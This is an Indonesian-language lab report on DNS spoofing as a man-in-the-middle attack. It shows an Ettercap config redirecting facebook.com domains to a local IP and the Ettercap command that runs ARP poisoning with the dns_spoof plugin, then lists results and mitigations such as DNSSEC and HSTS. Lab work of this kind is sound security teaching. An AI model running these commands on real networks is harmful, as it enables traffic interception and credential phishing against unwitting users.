DNS Spoofing – Man-in-the-Middle Attack

Experimenter: Toki
Environment: Kali Linux
Date: 7 November 2025

1. Pendahuluan

DNS Spoofing adalah teknik serangan yang memanipulasi resolusi DNS agar korban diarahkan ke situs palsu. Teknik ini umumnya dikombinasikan dengan ARP Spoofing untuk mencapai posisi Man-in-the-Middle (MITM).

2. Tujuan Praktikum

  • Memahami konsep DNS Spoofing
  • Mengonfigurasi file DNS spoof Ettercap
  • Menguji pengalihan domain ke server palsu
  • Menganalisis risiko keamanan DNS

3. Konfigurasi DNS Spoofing

sudo nano /etc/ettercap/etter.dns

www.facebook.com   A   192.168.1.50
*.facebook.com     A   192.168.1.50

4. Menjalankan DNS Spoofing

sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof

5. Hasil Pengujian

  • Resolusi DNS berhasil dimanipulasi
  • Korban diarahkan ke server palsu
  • Lalu lintas dapat dianalisis

6. Analisis Keamanan

DNS Spoofing mengekspos kelemahan DNS tanpa validasi. Tanpa DNSSEC dan HTTPS enforcement, pengguna sangat rentan.

7. Mitigasi

  • DNSSEC
  • HTTPS & HSTS
  • VPN
  • IDS/IPS

8. Kesimpulan

DNS Spoofing dapat dilakukan dengan mudah ketika penyerang berada di posisi MITM. Kesadaran keamanan DNS sangat krusial.
